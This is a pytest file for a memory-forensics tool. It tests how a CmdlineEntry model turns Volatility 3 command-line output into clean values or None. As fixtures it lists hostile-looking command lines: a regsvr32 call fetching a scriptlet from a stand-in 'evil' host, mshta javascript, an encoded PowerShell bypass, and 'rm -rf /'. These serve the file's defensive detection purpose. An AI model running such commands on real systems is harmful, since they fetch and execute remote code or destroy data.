"""Pydantic-level tests for :class:`CmdlineEntry`.

These exercise the model's validator chain directly (no subprocess
mock, no orchestrator). The pipeline-level refusal contract that
:class:`ValidationError` surfaces as
:attr:`VolFailureReason.OUTPUT_PARSE_FAILED` is covered in
:mod:`test_vol_cmdline`."""

from __future__ import annotations

from typing import Any

import pytest
from pydantic import ValidationError

from silentwitness_mcp.tools._memory_models import CmdlineEntry


def _row(**overrides: Any) -> dict[str, Any]:
    base: dict[str, Any] = {"PID": 1234, "Process": "svchost.exe", "Args": "svchost.exe -k netsvcs"}
    base.update(overrides)
    return base


# ---------------------------------------------------------------------------
# Args normalisation — closed sentinel + placeholder catalogue
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "sentinel",
    [
        None,
        "",
        # JSON-stringy sentinels with case + whitespace + NUL drift.
        "null",
        "NULL",
        "None",
        "  null  ",
        "\tNull\n",
        "\x00",
        "   ",
        # Interleaved NUL + whitespace — chained .strip().strip("\x00")
        # would miss this (outer NULs go, embedded space remains, the
        # empty-string sentinel never fires). Regex strip catches it.
        "\x00 \x00",
        " \x00 \x00 ",
        "\x00null\x00",
        # Paged-out PEB placeholder — Vol3 emits "Required memory at 0x..."
        # with the hex address; the prefix MUST be anchored on "0x" so
        # a legitimate "Required memory at boot loader v2.0" cmdline
        # is NOT silently nulled.
        "Required memory at 0x7ffe4dc8 is not valid (process exited?)",
        " Required memory at 0x7ffe4dc8 is not valid",
        "required memory at 0x7ffe4dc8 is not valid",
        "REQUIRED MEMORY AT 0x7ffe4dc8 is not valid",
        "Swap layer is not available",
    ],
)
def test_args_no_string_available_collapses_to_none(sentinel: object) -> None:
    """``args is None`` honestly means "no string available". The
    strip + lowercase + prefix-catalogue defence rejects Vol3 renderer
    drift on capitalisation, leading indent, and the second known
    "couldn't read memory" prefix."""
    entry = CmdlineEntry.model_validate(_row(Args=sentinel))
    assert entry.args is None


@pytest.mark.parametrize(
    "real_cmdline",
    [
        # Normal application launches — verbatim preservation.
        "powershell.exe -NoP -ExecutionPolicy Bypass -enc abc=",
        "C:\\Windows\\Explorer.EXE",
        'cmd.exe /c "echo hello"',
        # LOLBin shapes — caveat advertises these as red flags.
        "rundll32.exe shell32.dll,Control_RunDLL evil.cpl",
        "regsvr32.exe /s /u /n /i:http://evil/x.sct scrobj.dll",
        "mshta.exe javascript:alert(1)",
        "msbuild.exe /p:Configuration=Release inline.csproj",
        "installutil.exe /U evil.dll",
        # Edge: a literal string CONTAINING the word "null" — must
        # NOT collapse (only the bare sentinel does).
        "null.exe --config=null",
        # Trap: a real cmdline that starts with the literal "Required
        # memory at" but is NOT followed by "0x" — anchoring on the
        # hex suffix prevents this from being silently nulled.
        "Required memory at boot loader v2.0",
        "Required memory atomically locked by /lock=on",
        # Mixed-case + suffix variant of the trap.
        "required memory at sector 7",
    ],
)
def test_args_real_command_lines_preserved_verbatim(real_cmdline: str) -> None:
    """Verbatim preservation is the entity-gate citation invariant.
    Any normalisation here (case-fold, whitespace-collapse, quoting)
    would break cross-tool span matching downstream."""
    entry = CmdlineEntry.model_validate(_row(Args=real_cmdline))
    assert entry.args == real_cmdline


def test_args_non_string_non_none_loud_fails() -> None:
    """The validator returns non-str values unchanged; Pydantic's
    outer ``str | None`` typing then loud-fails with ValidationError.
    A regression that coerced int → str silently would let bogus PID
    field values masquerade as command lines."""
    with pytest.raises(ValidationError):
        CmdlineEntry.model_validate(_row(Args=12345))
    with pytest.raises(ValidationError):
        CmdlineEntry.model_validate(_row(Args=["bash", "-c", "rm -rf /"]))


def test_no_cross_field_invariant_between_process_and_args() -> None:
    """Deliberate: a "System with non-None args" row IS the threat
    model vol_cmdline exists to detect (PEB tamper via
    RtlInitUnicodeString). Encoding that pairing as a type invariant
    would make tampered rows un-representable, defeating the tool's
    purpose. This test pins that design choice."""
    # System (PID 4) with real-looking args — tamper signal candidate,
    # not a schema error.
    tampered = CmdlineEntry.model_validate(
        {"PID": 4, "Process": "System", "Args": "powershell.exe -enc abc="}
    )
    assert tampered.args == "powershell.exe -enc abc="
